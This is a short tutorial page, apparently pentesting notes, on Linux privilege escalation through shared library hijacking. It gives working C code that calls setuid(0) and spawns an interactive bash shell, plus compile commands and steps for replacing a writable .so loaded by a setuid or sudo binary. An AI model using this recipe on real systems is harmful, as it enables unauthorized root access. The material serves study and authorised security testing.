---
title: Shared Library Hijacking
description: 
tags:
    - Linux
    - Privilege Escalation
refs:
date: 2023-09-13
draft: false
---

## Investigation

When we find the binary file as setuid or sudo command, check the strings of the binary file.

```bash
strings ./example
strace ./example
gdb ./example

...
foo.so
...
```

If the binary file uses a shared library (e.g. **`foo.so`**) and this library can be modified, we can update it and get a root shell.

```bash
find / -type f -name "foo.so" 2>/dev/null
ls -al /path/to/foo.so

drwxrwxrwx 1 user user 64 Dec 15 09:13 foo.so
```

<br /><br />

## Exploitation

Create **"foo.c"**. 

```c
#include <stdlib.h>
#include <unistd.h>

void foo() {
    setuid(0);
    setgid(0);
    system("/bin/bash -i");
}
```

Then compile it to shared object.

```bash
gcc -shared -fPIC -nostartfiles -o foo.so foo.c
```

Put the shared file to **`/path/to/foo.so`** .  
Now run the binary.

```bash
./example
# or
sudo ./example
```

We should get a root shell.
